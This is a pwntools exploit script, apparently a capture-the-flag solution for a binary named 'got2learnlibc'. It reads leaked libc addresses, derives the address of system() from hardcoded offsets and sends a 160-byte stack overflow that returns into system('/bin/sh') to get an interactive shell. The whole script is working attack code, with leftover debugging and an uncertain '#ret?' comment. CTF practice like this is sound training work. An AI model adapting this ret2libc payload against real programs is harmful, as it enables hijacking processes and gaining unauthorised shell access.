#!/usr/bin/env python

from pwn import *

pico = 0

if pico:
	r = process("./vuln")
else:
	#env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./pico32.libc.so.6")}
	r = process("./got2learnlibc")#,env=env)
	gdb.attach(r, '''
		bp 0x7fd
	 	c
	 	''')

print r.recvuntil("puts:")
puts = r.recvline().strip()
print puts
puts = int(puts,16)

print r.recvuntil("fflush")
fflush = r.recvline().strip()
print fflush
fflush = int(fflush,16)
system = fflush - 0x229f0 - 0x6d0

print r.recvuntil("useful_string:")
binsh = r.recvline().strip()
print binsh
binsh = int(binsh, 16)

libcbinsh = system + 0x11e6eb

print "fflush, ", hex(fflush)

print "binsh, ", hex(binsh)

print "system, ", hex(system)
print "libcbinsh, ", hex(libcbinsh)

payload = ''
payload += 'A'*160
payload += p32(system)
payload += p32(system) #ret?
payload += p32(binsh)

r.sendline(payload)

r.interactive()